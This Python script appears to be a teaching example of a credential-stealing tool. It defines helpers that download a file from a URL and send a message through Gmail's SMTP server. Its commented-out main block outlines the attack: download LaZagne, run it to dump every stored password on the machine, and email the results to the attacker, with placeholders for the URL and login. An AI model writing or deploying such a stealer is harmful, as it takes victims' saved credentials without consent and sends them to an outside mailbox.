#!/usr/bin/env python3

import requests
import subprocess
import smtplib
import re

def send_mail(email, password, message):
    """
    Executes system command, saves output to variable and emails output to email of choice.
    Server used for sending email: Google's server, as Google allows people to use their server to send emails.
    Note: Google's email server runs on port 587.

    :param email: str
    :param password: str
    :param message: str
    :return:
    """

    server = smtplib.SMTP("smtp.gmail.com", 587)  #create instance of SMTP server
    server.starttls()  #initiate TLS connection
    server.login(email, password)
    server.sendmail(email, email, message)  #send email to self
    server.quit()

def download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]  #incl extension
    with open(f"{file_name}", "wb") as file:  #wb - write a binary file
        file.write(response.content)


if __name__ == "__main__":
    pass
    # download(<path_to_lazagne_download>)  ##uncomment and add working LaZagne download URL
    # command = "laZagne.exe all"
    # result = subprocess.check_output(command, shell=True)  #executes system command and saves return variable
    # send_mail(<email>, <pw>, resuls)


